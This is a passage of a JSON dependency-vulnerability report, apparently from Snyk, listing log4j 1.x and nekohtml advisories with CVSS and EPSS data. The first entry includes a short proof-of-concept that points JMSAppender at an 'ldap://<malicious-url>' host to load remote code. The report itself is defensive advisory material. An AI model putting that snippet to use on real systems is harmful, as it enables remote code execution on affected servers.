      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. <br /> **Note:** Even though this vulnerability appears to be related to the [log4j 2.x vulnerability](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHELOGGINGLOG4J-2314720), the 1.x branch of the module requires an attacker to have access to modify configurations to be exploitable, which is rarely possible.\r\n\r\nIn order to leverage this vulnerability the following conditions must be met:\r\n\r\n1. The application has enabled `JMSAppender` (or a class that extends `JMSAppender`)\r\n2. The attacker has access to directly modify the `TopicBindingName` or `TopicConnectionFactoryBindingName` configuration variables - which is an unlikely scenario \r\n\r\nIf these conditions are met, log4j 1.x allows a `lookup` feature that does not protect against attacker-controlled LDAP and other JNDI related endpoints. Therefore, an attacker with access to the aforementioned configuration variables is able to execute arbitrary code when loaded from an LDAP server.\r\n\r\n## PoC\r\n\r\n```\r\nimport org.apache.log4j.net.JMSAppender;\r\n// ...\r\nJMSAppender a = new JMSAppender();\r\na.setTopicConnectionFactoryBindingName(\"ldap://<malicious-url>\");\r\n// OR a.setTopicBindingName(\"ldap://<malicious-url>\");\r\na.activateOptions();\r\n```\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mail](https://lists.apache.org/thread/0x4zvtq92yggdgvwfgsftqrj4xx5w0nx)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [GitHub Comment](https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301)\n- [GitHub Discussion](https://github.com/apache/logging-log4j2/pull/608)\n",
      "epssDetails": {
        "percentile": "0.98358",
        "probability": "0.89218",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2021-4104"
        ],
        "CWE": [
          "CWE-94"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2021-12-13T14:52:40.887231Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2021-12-10T00:00:00Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2021-12-13T15:31:00Z",
      "modificationTime": "2023-09-28T10:34:57.544358Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2342645",
      "title": "SQL Injection",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://logging.apache.org/log4j/1.2/index.html",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-07-26T01:11:24.708151Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "modificationTime": "2022-05-11T11:31:53.940580Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-11-27T21:23:50.447464Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to SQL Injection. By design, the `JDBCAppender` in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from `PatternLayout`. The message converter, `%m`, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed.\r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use the `JDBCAppender`, which is not the default. \r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions. Beginning in version 2.0-beta8, the `JDBCAppender` was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs.\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/pt6lh3pbsvxqlwlp4c5l798dv2hkc85y)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/e845f28e7fb0ecbc0fcce383b11179f2650a51a2)\n",
      "epssDetails": {
        "percentile": "0.71874",
        "probability": "0.00443",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23305"
        ],
        "CWE": [
          "CWE-89"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2022-01-18T17:06:29.378900Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-18T17:01:37Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2022-01-18T17:13:25Z",
      "modificationTime": "2023-09-28T10:30:34.953517Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2342646",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://logging.apache.org/log4j/1.2/index.html",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-07-26T01:11:23.442829Z"
        },
        {
          "assigner": "SUSE",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "modificationTime": "2022-05-11T11:32:04.853481Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-11-27T21:23:46.897083Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/64902fe18ce5a5dd40487051a2f6231d9fbbe9b0)\n",
      "epssDetails": {
        "percentile": "0.79566",
        "probability": "0.00797",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23307"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2022-01-18T17:08:37.955423Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-18T17:06:32Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2022-01-18T17:13:25Z",
      "modificationTime": "2023-09-28T10:37:55.904293Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "id": "SNYK-JAVA-LOG4J-2342647",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "credit": [
        "Unknown"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 8.1,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w",
          "title": "Apache Mailing List"
        },
        {
          "url": "https://logging.apache.org/log4j/1.2/index.html",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9",
          "title": "Reload4j Fix Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-07-26T01:11:25.323210Z"
        },
        {
          "assigner": "SUSE",
          "severity": "medium",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 6.6,
          "modificationTime": "2022-05-11T11:31:14.452251Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "modificationTime": "2022-11-27T21:20:50.584044Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. `JMSSink` in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a `TopicConnectionFactoryBindingName` configuration causing `JMSSink` to perform `JNDI` requests that result in remote code execution in a similar fashion to [`CVE-2021-4104`](https://security.snyk.io/vuln/SNYK-JAVA-LOG4J-2316893).  \r\n\r\n*Note:* this issue only affects Log4j 1.x when specifically configured to use `JMSSink`, which is not the default.\r\n\r\nApache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Mailing List](https://lists.apache.org/thread/bsr3l5qz4g0myrjhy9h67bcxodpkwj4w)\n- [Apache Security Advisory](https://logging.apache.org/log4j/1.2/index.html)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [Reload4j Fix Commit](https://github.com/qos-ch/reload4j/commit/f221f2427c45134cf5768f46279ddf72fe1407c9)\n",
      "epssDetails": {
        "percentile": "0.79473",
        "probability": "0.00790",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-23302"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2022-01-18T17:25:51.891230Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-01-18T17:22:50Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2022-01-18T17:28:19Z",
      "modificationTime": "2023-09-28T10:31:47.894637Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "id": "SNYK-JAVA-LOG4J-3358774",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "Garrett Tucker of Red Hat"
      ],
      "semver": {
        "vulnerable": [
          "[1.0.4,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "medium",
      "cvssScore": 5.9,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread/wkx6grrcjkh86crr49p4blc1v1nflj3t",
          "title": "Apache Lists"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-16T01:10:11.157125Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-30T13:31:03.696549Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). When using the `Chainsaw` or `SocketAppender` components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-crafted, deeply nested `hashmap` or `hashtable` (depending on which logging component is in use) to be processed could exhaust the available memory in the virtual machine and achieve denial of service when the object is deserialized. \r\n\r\nThis issue affects Apache Log4j before 2. Affected users are recommended to update to Log4j 2.x `org.apache.logging.log4j/log4j-core`.  \r\n\r\n*NOTE:* This vulnerability only affects products that are no longer supported by the maintainer.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Lists](https://lists.apache.org/thread/wkx6grrcjkh86crr49p4blc1v1nflj3t)\n",
      "epssDetails": {
        "percentile": "0.37094",
        "probability": "0.00089",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2023-26464"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-vp98-w2p3-mv35"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2023-03-11T13:18:05.378536Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2023-03-10T15:30:43Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2023-03-11T13:18:05.600249Z",
      "modificationTime": "2023-09-28T09:38:02.694904Z",
      "socialTrendAlert": false,
      "severityWithCritical": "medium",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "id": "SNYK-JAVA-LOG4J-572732",
      "title": "Deserialization of Untrusted Data",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "credit": [
        "Marcio Almeida de Macedo"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Proof of Concept",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "critical",
      "cvssScore": 9.8,
      "functions": [
        {
          "version": [
            "[0,]"
          ],
          "functionId": {
            "filePath": "org/apache/log4j/net/SocketServer.java",
            "className": "SocketServer",
            "functionName": "main"
          }
        }
      ],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "log4j:log4j",
      "references": [
        {
          "url": "https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E",
          "title": "Apache Security Advisory"
        },
        {
          "url": "https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html",
          "title": "Atlassian Patch"
        },
        {
          "url": "https://0xsapra.github.io/website/CVE-2019-17571",
          "title": "PoC"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "NVD",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-07-26T01:11:37.621986Z"
        },
        {
          "assigner": "SUSE",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-05-03T23:36:31.140776Z"
        },
        {
          "assigner": "Red Hat",
          "severity": "critical",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "modificationTime": "2022-10-26T20:30:52.296974Z"
        }
      ],
      "description": "## Overview\n[log4j:log4j](https://github.com/apache/log4j) is a 1.x branch of the Apache Log4j project.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gadget when listening to untrusted network traffic for log data.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nThere is no fixed version for `log4j:log4j`.\n## References\n- [Apache Security Advisory](https://lists.apache.org/thread.html/eea03d504b36e8f870e8321d908e1def1addda16adda04327fe7c125%40%3Cdev.logging.apache.org%3E)\n- [Atlassian Patch](https://confluence.atlassian.com/jirakb/list-of-security-vulnerabilities-addressed-in-atlassian-log4j1-1141965553.html)\n- [PoC](https://0xsapra.github.io/website/CVE-2019-17571)\n",
      "epssDetails": {
        "percentile": "0.99947",
        "probability": "0.97467",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2019-17571"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-2qrg-x229-3v8q"
        ]
      },
      "packageName": "log4j:log4j",
      "proprietary": false,
      "creationTime": "2020-06-18T15:47:31.144561Z",
      "functions_new": [
        {
          "version": [
            "[0,]"
          ],
          "functionId": {
            "className": "org.apache.log4j.net.SocketServer",
            "functionName": "main"
          }
        }
      ],
      "alternativeIds": [],
      "disclosureTime": "2019-12-22T09:33:11Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "log4j",
        "artifactId": "log4j"
      },
      "publicationTime": "2020-06-19T09:33:01Z",
      "modificationTime": "2023-09-28T10:33:14.290033Z",
      "socialTrendAlert": false,
      "severityWithCritical": "critical",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "log4j:log4j@1.2.16"
      ],
      "upgradePath": [
        false,
        "org.owasp.esapi:esapi@2.5.0.0"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "log4j:log4j",
      "version": "1.2.16"
    },
    {
      "id": "SNYK-JAVA-NETSOURCEFORGENEKOHTML-2621454",
      "title": "Denial of Service (DoS)",
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
      "credit": [
        "이형관 (windshock)"
      ],
      "semver": {
        "vulnerable": [
          "[0,]"
        ]
      },
      "exploit": "Not Defined",
      "fixedIn": [],
      "patches": [],
      "insights": {
        "triageAdvice": null
      },
      "language": "java",
      "severity": "high",
      "cvssScore": 7.5,
      "functions": [],
      "malicious": false,
      "isDisputed": false,
      "moduleName": "net.sourceforge.nekohtml:nekohtml",
      "references": [
        {
          "url": "https://github.com/sparklemotion/nekohtml/commit/a800fce3b079def130ed42a408ff1d09f89e773d",
          "title": "GitHub Commit"
        }
      ],
      "cvssDetails": [
        {
          "assigner": "Red Hat",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2023-03-26T14:47:52.054472Z"
        },
        {
          "assigner": "NVD",
          "severity": "high",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
          "cvssV3BaseScore": 7.5,
          "modificationTime": "2022-07-26T01:11:19.792610Z"
        }
      ],
      "description": "## Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS) due to an uncaught `java.lang.OutOfMemoryError` exception when parsing ill-formed HTML markup.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nA fix was pushed into the `master` branch but not yet published.\n## References\n- [GitHub Commit](https://github.com/sparklemotion/nekohtml/commit/a800fce3b079def130ed42a408ff1d09f89e773d)\n",
      "epssDetails": {
        "percentile": "0.46292",
        "probability": "0.00127",
        "modelVersion": "v2023.03.01"
      },
      "identifiers": {
        "CVE": [
          "CVE-2022-24839"
        ],
        "CWE": [
          "CWE-400"
        ],
        "GHSA": [
          "GHSA-9849-p7jc-9rmv"
        ]
      },
      "packageName": "net.sourceforge.nekohtml:nekohtml",
      "proprietary": false,
      "creationTime": "2022-04-12T11:45:16.731969Z",
      "functions_new": [],
      "alternativeIds": [],
      "disclosureTime": "2022-04-12T11:40:23Z",
      "packageManager": "maven",
      "mavenModuleName": {
        "groupId": "net.sourceforge.nekohtml",
        "artifactId": "nekohtml"
      },
      "publicationTime": "2022-04-12T14:21:53.906896Z",
      "modificationTime": "2023-03-26T14:47:52.054472Z",
      "socialTrendAlert": false,
      "severityWithCritical": "high",
      "from": [
        "io.github.jensdietrich.xshady:CVE-2013-5960@1.0.0",
        "org.owasp.esapi:esapi@2.1.0",
        "org.owasp.antisamy:antisamy@1.4.3",
